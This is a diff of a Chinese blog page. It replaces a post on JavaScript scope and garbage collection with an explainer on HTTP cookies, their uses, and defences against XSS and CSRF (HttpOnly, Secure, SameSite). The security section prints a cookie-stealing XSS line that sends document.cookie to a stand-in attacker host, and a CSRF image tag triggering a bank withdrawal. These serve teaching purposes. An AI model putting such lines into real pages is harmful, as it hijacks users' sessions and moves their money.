@@ -6,22 +6,26 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>JavaScript高级程序设计重读---4章 | gdccwxx</title>
+  <title>管中窥豹看Cookie | gdccwxx</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="变量、作用域、和内存问题引用类型Javascript不允许直接访问内存中的位置，意思位不能直接操作对象的内存空间。在操作对象时，实际上是在操作对象的引用而不是实际的对象。为此，引用类型的值是按引用访问的1234var obj1 = new Object();var obj2 = obj1;obj1.name = &amp;apos;dechen&amp;apos;obj2.name   // dechen 对象是">
-<meta name="keywords" content="JavaScript">
+  <meta name="description" content="本文主要介绍了什么是cookie、cookie的特性、cookie的作用及用途、cookie的安全策略。不涉及Cookie的详细参数。 Cookie介绍以下Wikipedia、MDN对cookie的介绍  Wikipedia: Cookie（复数形态Cookies），又称为“小甜饼”。类型为“小型文本文件”，指某些网站为了辨别用户身份而储存在用户本地终端（Client Side）上的数据（通常经过">
+<meta name="keywords" content="HTTP">
 <meta property="og:type" content="article">
-<meta property="og:title" content="JavaScript高级程序设计重读---4章">
-<meta property="og:url" content="http://yoursite.com/2017/07/11/read-javascript-again-chapter4/index.html">
+<meta property="og:title" content="管中窥豹看Cookie">
+<meta property="og:url" content="http://yoursite.com/2019/04/09/basic-cookies/index.html">
 <meta property="og:site_name" content="gdccwxx">
-<meta property="og:description" content="变量、作用域、和内存问题引用类型Javascript不允许直接访问内存中的位置，意思位不能直接操作对象的内存空间。在操作对象时，实际上是在操作对象的引用而不是实际的对象。为此，引用类型的值是按引用访问的1234var obj1 = new Object();var obj2 = obj1;obj1.name = &amp;apos;dechen&amp;apos;obj2.name   // dechen 对象是">
+<meta property="og:description" content="本文主要介绍了什么是cookie、cookie的特性、cookie的作用及用途、cookie的安全策略。不涉及Cookie的详细参数。 Cookie介绍以下Wikipedia、MDN对cookie的介绍  Wikipedia: Cookie（复数形态Cookies），又称为“小甜饼”。类型为“小型文本文件”，指某些网站为了辨别用户身份而储存在用户本地终端（Client Side）上的数据（通常经过">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://yoursite.com/2017/07/11/read-javascript-again-chapter4/heapObject.png">
-<meta property="og:updated_time" content="2018-05-04T01:25:41.781Z">
+<meta property="og:image" content="http://yoursite.com/2019/04/09/basic-cookies/exchange-cookies.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/09/basic-cookies/font-transfer-cookie.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/09/basic-cookies/out-path-cookie.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/09/basic-cookies/in-path-cookie.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/09/basic-cookies/unlogin-cookie.png">
+<meta property="og:updated_time" content="2019-04-10T13:49:45.327Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="JavaScript高级程序设计重读---4章">
-<meta name="twitter:description" content="变量、作用域、和内存问题引用类型Javascript不允许直接访问内存中的位置，意思位不能直接操作对象的内存空间。在操作对象时，实际上是在操作对象的引用而不是实际的对象。为此，引用类型的值是按引用访问的1234var obj1 = new Object();var obj2 = obj1;obj1.name = &amp;apos;dechen&amp;apos;obj2.name   // dechen 对象是">
-<meta name="twitter:image" content="http://yoursite.com/2017/07/11/read-javascript-again-chapter4/heapObject.png">
+<meta name="twitter:title" content="管中窥豹看Cookie">
+<meta name="twitter:description" content="本文主要介绍了什么是cookie、cookie的特性、cookie的作用及用途、cookie的安全策略。不涉及Cookie的详细参数。 Cookie介绍以下Wikipedia、MDN对cookie的介绍  Wikipedia: Cookie（复数形态Cookies），又称为“小甜饼”。类型为“小型文本文件”，指某些网站为了辨别用户身份而储存在用户本地终端（Client Side）上的数据（通常经过">
+<meta name="twitter:image" content="http://yoursite.com/2019/04/09/basic-cookies/exchange-cookies.png">
   
     <link rel="alternative" href="/atom.xml" title="gdccwxx" type="application/atom+xml">
   
@@ -162,42 +166,175 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-read-javascript-again-chapter4" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-basic-cookies" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      JavaScript高级程序设计重读---4章
+      管中窥豹看Cookie
     </h1>
   
 
         
-        <a href="/2017/07/11/read-javascript-again-chapter4/" class="archive-article-date">
-  	<time datetime="2017-07-11T03:54:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-07-11</time>
+        <a href="/2019/04/09/basic-cookies/" class="archive-article-date">
+  	<time datetime="2019-04-09T13:14:04.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-04-09</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="变量、作用域、和内存问题"><a href="#变量、作用域、和内存问题" class="headerlink" title="变量、作用域、和内存问题"></a>变量、作用域、和内存问题</h3><h4 id="引用类型"><a href="#引用类型" class="headerlink" title="引用类型"></a>引用类型</h4><p>Javascript不允许直接访问内存中的位置，意思位不能直接操作对象的内存空间。在操作对象时，实际上是在操作对象的引用而不是实际的对象。为此，引用类型的值是按引用访问的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var obj1 = new Object();</span><br><span class="line">var obj2 = obj1;</span><br><span class="line">obj1.name = &apos;dechen&apos;</span><br><span class="line">obj2.name   // dechen</span><br></pre></td></tr></table></figure></p>
-<p>对象是存在堆中，JavaScript只能引用堆中的Object。如图<br><img src="/2017/07/11/read-javascript-again-chapter4/heapObject.png" alt="heap"><br>而由于复制后的两个变量对象都指向堆内存中的一个Object，因此改变一个后，另一个也会随着改变</p>
-<h5 id="函数在对象的传递是按值传递"><a href="#函数在对象的传递是按值传递" class="headerlink" title="函数在对象的传递是按值传递"></a>函数在对象的传递是按值传递</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">unction setName(obj)&#123;</span><br><span class="line">    obj.name = &apos;dechen&apos;</span><br><span class="line">    obj = new Object();</span><br><span class="line">    obj.name = &apos;guo&apos;</span><br><span class="line">&#125;</span><br><span class="line">var person = new Object();</span><br><span class="line">setName(person)</span><br><span class="line">person.name     // dechen</span><br></pre></td></tr></table></figure>
-<p>解释：由于传入的person给obj复制了一份引用。因此一开始的时候是obj和person引用的是同一个。而第二段代码中，由于obj改变了新的引用。在改变之前，使person的name发生改变。而之后引用新的Object，因此person.name依然是dechen。在函数执行之后，obj立即被销毁。</p>
-<h4 id="检测类型"><a href="#检测类型" class="headerlink" title="检测类型"></a>检测类型</h4><p>利用typeof检查五个基本类型，而对于对象的类型检测，则采用instanceof<br>result = variable instanceof constructor</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">person instanceof Object    //true</span><br><span class="line">pattern instanceof  RegExp  //true</span><br></pre></td></tr></table></figure>
-<h4 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h4><p>通常来说，一段程序代码中所用到的名字并不总是有效/可用的，而限定这个名字的可用性的代码范围就是这个名字的作用域。</p>
-<h5 id="延长作用域"><a href="#延长作用域" class="headerlink" title="延长作用域"></a>延长作用域</h5><p>利用with，以及try-catch语句中可以延长作用域</p>
-<h5 id="没有块级作用域"><a href="#没有块级作用域" class="headerlink" title="没有块级作用域"></a>没有块级作用域</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if(true)&#123;</span><br><span class="line">    var color = &apos;blue&apos;</span><br><span class="line">&#125;</span><br><span class="line">color // blue</span><br><span class="line">for(var i = 0;i&lt;10;i++)&#123;</span><br><span class="line">    doSomething(i)</span><br><span class="line">&#125;</span><br><span class="line">i // 10</span><br></pre></td></tr></table></figure>
-<p>从上面可以看出，在花括号中是不算作用域的。因此，在es5的下是没有块级作用域的</p>
-<h4 id="垃圾收集"><a href="#垃圾收集" class="headerlink" title="垃圾收集"></a>垃圾收集</h4><p>JavaScript是具有自动手机垃圾的机制的</p>
-<h5 id="标记清除"><a href="#标记清除" class="headerlink" title="标记清除"></a>标记清除</h5><p>当变量进入环境时(如在函数声明一个变量时)九江变量标记位’进入环境’。从逻辑上讲，永远不能释放进入环境变量所占用的内存。当变量离开环境时，则将其标记为’离开环境‘</p>
-<h5 id="引用计数"><a href="#引用计数" class="headerlink" title="引用计数"></a>引用计数</h5><p>引用一次，引用次数+1，引用另外一个值，引用-1，当到达0时，将其清除。<br>Bug：循环引用时，导致无法清除。多个引用存在时，导致内存消耗而崩溃。</p>
-<h4 id="性能问题"><a href="#性能问题" class="headerlink" title="性能问题"></a>性能问题</h4><p>IE6使用内存分配，就是256个变量，4096个对象(或数组)字面量和数组元素或者64KB字符串执行自动清理。由于频繁清理，导致严重性能问题<br>IE7的垃圾收集机制，初始值和IE6相等，如果垃圾手机里程回收的内存分配量低于15%，则变量、字面量和数组元素的临界值就会翻倍。如果历程回收了85%，则重回默认值</p>
-<h4 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h4><p>位确保占用最少的内存可以让页面获得更好的性能，优化内存的最佳方式。就是位执行的代码只保存必要的数据。一旦数据不在游泳，最好通过其值设为null来释放其引用。这叫接触引用。</p>
-<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>通过本章的学习，让我更理解了js这门语言的垃圾清理以及变量问题。采用简单的思路可以解决更好的问题。今后的coding会采用更简单，更高效的使用方法去解决问题</p>
+        <p>本文主要介绍了什么是cookie、cookie的特性、cookie的作用及用途、cookie的安全策略。不涉及Cookie的<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies" target="_blank" rel="noopener">详细参数</a>。</p>
+<h2 id="Cookie介绍"><a href="#Cookie介绍" class="headerlink" title="Cookie介绍"></a>Cookie介绍</h2><p>以下Wikipedia、MDN对cookie的介绍</p>
+<blockquote>
+<p><strong>Wikipedia:</strong></p>
+<p>Cookie（复数形态Cookies），又称为“小甜饼”。类型为“<strong>小型文本文件</strong>”，指某些网站为了辨别用户身份而储存在用户本地终端（Client Side）上的数据（通常经过加密）。由网景公司的前雇员卢·蒙特利在1993年3月发明。最初定义于RFC 2109。当前使用最广泛的 Cookie标准却不是RFC中定义的任何一个，而是在网景公司制定的标准上进行扩展后的产物。</p>
+<p><strong>MDN:</strong></p>
+<p>HTTP Cookie（也叫Web Cookie或浏览器Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie使基于无状态的HTTP协议记录稳定的状态信息成为了可能。</p>
+</blockquote>
+<p><strong>划重点：小型文本文件、辨别用户身份存储在用户本地、判断是否来自同一浏览器、保持登录态</strong></p>
+<p>Cookie的最初想法是当作小型文本文件，在HTTP请求中作为用户数据作为信息传递。最常规的用法是服务器给客户端一个唯一标识，客户端在与服务器互动时将标识回传给服务器，客户端即可判断用户登录态。</p>
+<div style="width: 80%; margin: 0 auto;text-align:center"><img src="/2019/04/09/basic-cookies/./exchange-cookies.png" alt="cookies消息传递">Cookies的传输</div>
+
+<p><strong>注意</strong>：<em>Cookie曾一度用于客户端数据的存储，因当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，cookie渐渐被淘汰。</em></p>
+<h2 id="Cookie的特性"><a href="#Cookie的特性" class="headerlink" title="Cookie的特性"></a>Cookie的特性</h2><h3 id="前端数据存储及读写"><a href="#前端数据存储及读写" class="headerlink" title="前端数据存储及读写"></a>前端数据存储及读写</h3><p>Cookie可由前端进行操作，可将数据暂存至cookie中。JavaScript操作cookie<br><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie" target="_blank" rel="noopener">document.cookie</a><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// document.cookie=newCookie 向Cookie中添加新的Cookie Cookie为key=value形式</span></span><br><span class="line"><span class="comment">// 可设置path，domain，max-age，expires，secure</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 增加cookie</span></span><br><span class="line"><span class="built_in">document</span>.cookie = <span class="string">`someCookieName=true; expires=<span class="subst">$&#123;<span class="keyword">new</span> <span class="built_in">Date</span>().toGMTString() + <span class="number">1</span>&#125;</span>; path=/`</span></span><br><span class="line"><span class="comment">// 删除cookie 通过设置过去的时间删除cookie</span></span><br><span class="line"><span class="built_in">document</span>.cookie = <span class="string">`someCookieName=true; expires=<span class="subst">$&#123;<span class="keyword">new</span> <span class="built_in">Date</span>().toGMTString() - <span class="number">1</span>&#125;</span>; path=/`</span></span><br><span class="line"><span class="comment">// 修改cookie</span></span><br><span class="line"><span class="built_in">document</span>.cookie = <span class="string">`someCookieName=false; expires=<span class="subst">$&#123;<span class="keyword">new</span> <span class="built_in">Date</span>().toGMTString() + <span class="number">1</span>&#125;</span>; path=/`</span></span><br><span class="line"><span class="comment">// 查找cookie</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">"(?:^|;\\s*)"</span> + <span class="built_in">encodeURIComponent</span>(<span class="string">"需要查找的cookie"</span>).replace(<span class="regexp">/[-.+*]/g</span>, <span class="string">"\\$&amp;"</span>) + <span class="string">"\\s*\\="</span>)).test(<span class="built_in">document</span>.cookie)</span><br></pre></td></tr></table></figure></p>
+<h3 id="后端通过http头设置"><a href="#后端通过http头设置" class="headerlink" title="后端通过http头设置"></a>后端通过http头设置</h3><p>后端可以通过设置cookie来设置传递的cookie。Nodejs操作cookie, Koa设置cookie<a href="https://github.com/pillarjs/cookies" target="_blank" rel="noopener">参数</a><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 以nodejs为例</span></span><br><span class="line"><span class="comment">// 获取</span></span><br><span class="line">response.getHeader(<span class="string">"Cookie"</span>);</span><br><span class="line"><span class="comment">// 设置</span></span><br><span class="line">response.setHeader(<span class="string">"Cookie"</span>, [<span class="string">"name=gdccwxx"</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 以koa为例</span></span><br><span class="line"><span class="comment">// 获取</span></span><br><span class="line">ctx.cookies.get(name, [options])</span><br><span class="line"><span class="comment">// 设置</span></span><br><span class="line">ctx.cookies.set(name, value, [options])</span><br></pre></td></tr></table></figure></p>
+<h3 id="请求时通过http头传给后端"><a href="#请求时通过http头传给后端" class="headerlink" title="请求时通过http头传给后端"></a>请求时通过http头传给后端</h3><p>以Google键入请求为例</p>
+<div style="width: 80%; margin: 0 auto;text-align:center"><img src="/2019/04/09/basic-cookies/./font-transfer-cookie.png" alt="请求Google">请求通过http头传送给后端</div>
+
+<h3 id="遵守同源策略"><a href="#遵守同源策略" class="headerlink" title="遵守同源策略"></a>遵守同源策略</h3><p>Domain 和 Path 标识定义了cookie的作用域：即cookie应该发送给哪些URL。<br>Domain 标识指定了哪些主机可以接受cookie。如果不指定，默认为当前文档的主机（<strong>不包含子域名</strong>）。如果指定了Domain，则一般包含子域名。例如，如果设置 Domain=mozilla.org，则Cookie也包含在子域名中（如developer.mozilla.org）。</p>
+<h2 id="Cookie作用及用途"><a href="#Cookie作用及用途" class="headerlink" title="Cookie作用及用途"></a>Cookie作用及用途</h2><h3 id="Cookie的作用"><a href="#Cookie的作用" class="headerlink" title="Cookie的作用"></a>Cookie的作用</h3><p><strong>存储个性化设置</strong><br>即使在相同的Domain下，不同的url可以存储不同区块下的cookie，即到达特定页面下可有页面自己的cookie。</p>
+<div style="width: 80%; margin: 0 auto; text-align: center"><br>    <img src="/2019/04/09/basic-cookies/./out-path-cookie.png" alt="在主页的cookie"><br><br><br>  在google.com的cookie<br><br><br>  <img src="/2019/04/09/basic-cookies/./in-path-cookie.png" alt="在搜索的cookie"><br><br><br>  在google.com/search的cookie<br><br><br></div>
+
+<p>正因为cookie的作用域，使得cookie存储有着多样性。</p>
+<p><strong>存储未登陆时用户唯一标识</strong></p>
+<p>在可允许未登陆的网站，例如新浪微博。游客态下所做的事情可与用户态下可进行关联。<br>具体操作：<br>1、向未登陆的用户发送一个唯一的标识。<br>2、保留唯一标识所做的事情。<br>3、用户登录后关联账户及唯一标识所做的事情。</p>
+<p>以新浪微博为例：</p>
+<div style="width: 80%; margin: 0 auto; text-align: center"><br><img src="/2019/04/09/basic-cookies/./unlogin-cookie.png" alt="未登陆状态下的cookie"><br><br><br>未登录状态下的cookie：login_sid_t表示唯一标识<br></div>
+
+<p>通过唯一标识与登录态的绑定，可建立游客态与用户态的关联</p>
+<p><strong>存储已经登陆用户的凭证</strong><br>cookie中存储用户的唯一标识及简单token。简单token是通过某种形式与用户唯一标识的加密后得出的结果。后端取到token及用户唯一标识，可以通过检查token判断合法性及是否登陆过期判断用户是否为登录态。</p>
+<p><strong>存储其他业务数据</strong><br>可存储其他业务信息，例如用户生日等</p>
+<h3 id="Cookie的用途"><a href="#Cookie的用途" class="headerlink" title="Cookie的用途"></a>Cookie的用途</h3><p>了解Cookie的作用后，其主要用途是以下三个方面：</p>
+<ul>
+<li>会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）</li>
+<li>个性化设置（如用户自定义设置、主题等）</li>
+<li>浏览器行为跟踪（如跟踪分析用户行为等）</li>
+</ul>
+<h2 id="Cookie-的安全策略"><a href="#Cookie-的安全策略" class="headerlink" title="Cookie 的安全策略"></a>Cookie 的安全策略</h2><h3 id="Cookie与XSS的关系"><a href="#Cookie与XSS的关系" class="headerlink" title="Cookie与XSS的关系"></a>Cookie与XSS的关系</h3><p>在http会话劫持情况下，cookie与xss的关系就显得十分亲密了。看一段代码<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">new</span> Image()).src = <span class="string">"http://www.evil-domain.com/steal-cookie.php?cookie="</span> + <span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure></p>
+<p>这种情况下的cookie则会发送到攻击者的网站。</p>
+<h4 id="分析XSS攻击："><a href="#分析XSS攻击：" class="headerlink" title="分析XSS攻击："></a>分析XSS攻击：</h4><ul>
+<li>会话被劫持</li>
+<li>通过document获取cookie</li>
+</ul>
+<h4 id="解决办法："><a href="#解决办法：" class="headerlink" title="解决办法："></a>解决办法：</h4><ul>
+<li>会话劫持：使用cookie中Secure标识</li>
+<li>不被JavaScript调用cookie：使用cookie中HttpOnly标识</li>
+</ul>
+<h4 id="参数介绍"><a href="#参数介绍" class="headerlink" title="参数介绍"></a>参数介绍</h4><p><strong>Secure（目前Chrome、Firefox在52+版本不允许非安全的HTTP设置Cookie）</strong></p>
+<blockquote>
+<p>一个带有安全属性的 cookie 只有在请求使用SSL和HTTPS协议的时候才会被发送到服务器。然而，保密或敏感信息永远不要在 HTTP cookie 中存储或传输，因为整个机制从本质上来说都是不安全的，比如前述协议并不意味着所有的信息都是经过加密的。</p>
+</blockquote>
+<p>用法：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set</span>-Cookie: name=gdccwxx; secure</span><br></pre></td></tr></table></figure>
+<p><strong>HttpOnly</strong></p>
+<blockquote>
+<p>设置了 HttpOnly 属性的 cookie 不能使用 JavaScript 经由  <code>Document.cookie</code> 属性、<code>XMLHttpRequest</code> 和  <code>Request</code>APIs 进行访问，以防范跨站脚本攻击（XSS）。</p>
+</blockquote>
+<p>用法：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set</span>-Cookie: name=gdccwxx; HttpOnly</span><br></pre></td></tr></table></figure>
+<h3 id="Cookie与CSRF的关系"><a href="#Cookie与CSRF的关系" class="headerlink" title="Cookie与CSRF的关系"></a>Cookie与CSRF的关系</h3><p>CSRF利用了用户的Cookie，通过第三方请求跨站进行攻击。<br>以下Wikipedia中的一个例子：在不安全聊天室或论坛上的一张图片，它实际上是一个给你银行服务器发送提现的请求：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://bank.example.com/withdraw?account=bob&amp;amount=1000000&amp;for=mallory"</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>这种情况会直接在本地load图片，图片地址指向的是银行。若本地打开过该银行相关信息，且cookie有效，则会直接被攻击者的账户提现。</p>
+<h4 id="分析CSRF攻击"><a href="#分析CSRF攻击" class="headerlink" title="分析CSRF攻击"></a>分析CSRF攻击</h4><ul>
+<li>被攻击者本地Cookie信息没有过期</li>
+<li>银行转账系统无二次确认，直接转账</li>
+<li>第三方网站（不安全的聊天室或论坛）加载请求</li>
+<li>攻击者无法读写Cookie</li>
+</ul>
+<h4 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h4><ul>
+<li>敏感信息过期时效缩短：目标网站对敏感Cookie设置较短的过期时间</li>
+<li>增加二次确认：目标网站对敏感操作无二次确认</li>
+<li>不允许第三方网站带cookie访问：检查访问请求referer来源，禁止第三方网站访问。</li>
+<li>允许服务器要求某个cookie在跨站请求时不被发送：使用cookie中SameSite标识</li>
+</ul>
+<h4 id="参数介绍-1"><a href="#参数介绍-1" class="headerlink" title="参数介绍"></a>参数介绍</h4><p><strong>SameSite（目前兼容性不足，但不影响设置不支持该属性的浏览器）</strong></p>
+<blockquote>
+<p>允许服务器设定一则 cookie 不随着跨域请求一起发送，这样可以在一定程度上防范跨站请求伪造攻击（CSRF）。</p>
+</blockquote>
+<p>用法：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set</span>-Cookie: name=gdccwxx; SameSite <span class="comment">// default SameSite=Strict</span></span><br><span class="line"><span class="built_in">Set</span>-Cookie: name=gdccwxx; SameSite=Lax</span><br></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th style="text-align:left"><strong>请求类型</strong></th>
+<th><strong>例子</strong></th>
+<th><strong>非 SameSit</strong></th>
+<th><strong>SameSite = Lax</strong></th>
+<th><strong>SameSite = Strict</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">link</td>
+<td>&lt;a href=”…”></td>
+<td>Y</td>
+<td>Y</td>
+<td>N</td>
+</tr>
+<tr>
+<td style="text-align:left">prerender</td>
+<td>\&lt;link rel=”prerender” href=”…”></td>
+<td>Y</td>
+<td>Y</td>
+<td>N</td>
+</tr>
+<tr>
+<td style="text-align:left">form get</td>
+<td>&lt;form method=”get” action=”…”></td>
+<td>Y</td>
+<td>Y</td>
+<td>N</td>
+</tr>
+<tr>
+<td style="text-align:left">form post</td>
+<td>&lt;form method=”post” action=”…”></td>
+<td>Y</td>
+<td>N</td>
+<td>N</td>
+</tr>
+<tr>
+<td style="text-align:left">iframe</td>
+<td>&lt;iframe src=”…”></td>
+<td>Y</td>
+<td>N</td>
+<td>N</td>
+</tr>
+<tr>
+<td style="text-align:left">ajax</td>
+<td>$.get(‘…’)</td>
+<td>Y</td>
+<td>N</td>
+<td>N</td>
+</tr>
+<tr>
+<td style="text-align:left">image</td>
+<td>&lt;img src=”…”></td>
+<td>Y</td>
+<td>N</td>
+<td>N</td>
+</tr>
+</tbody>
+</table>
+<h2 id="要点总结："><a href="#要点总结：" class="headerlink" title="要点总结："></a>要点总结：</h2><ul>
+<li><strong>Cookie是服务器保存在本地的数据块</strong></li>
+<li><strong>每次请求都会包含cookie，因此会比较浪费资源</strong></li>
+<li><strong>使用document.cookie可访问非HttpOnly的cookie</strong></li>
+<li><strong>删除本地cookie只能通过给cookie设置过去的Expire删除</strong></li>
+<li><strong>常用鉴别用户身份的方法是给cookie设置签名或token</strong></li>
+<li><strong>为防止XSS、CSRF，应该尽量使用HttpOnly、Secure(https)、SameSite参数及检查referer</strong></li>
+</ul>
 
       
 
@@ -242,7 +379,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">JavaScript</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">HTTP</a>
         		</li>
       		
 		</ul>
@@ -298,7 +435,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2017/07/11/read-javascript-again-chapter4/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/04/09/basic-cookies/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -312,18 +449,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2017/07/12/read-javascript-again-chapter5/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          JavaScript高级程序设计重读---5章
-        
-      </div>
-    </a>
   
-  
-    <a href="/2017/07/11/read-javascript-again-chapter1-3/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">JavaScript高级程序设计重读—1-3章</div>
+    <a href="/2019/03/31/《大型网站技术架》读书笔记/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">《大型网站技术架》读书笔记</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -351,7 +479,7 @@
   
   <div class="duoshuo">
 	<!-- 多说评论框 start -->
-	<div class="ds-thread" data-thread-key="read-javascript-again-chapter4" data-title="JavaScript高级程序设计重读---4章" data-url="http://yoursite.com/2017/07/11/read-javascript-again-chapter4/"></div>
+	<div class="ds-thread" data-thread-key="basic-cookies" data-title="管中窥豹看Cookie" data-url="http://yoursite.com/2019/04/09/basic-cookies/"></div>
 	<!-- 多说评论框 end -->
 	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
 	<script type="text/javascript">
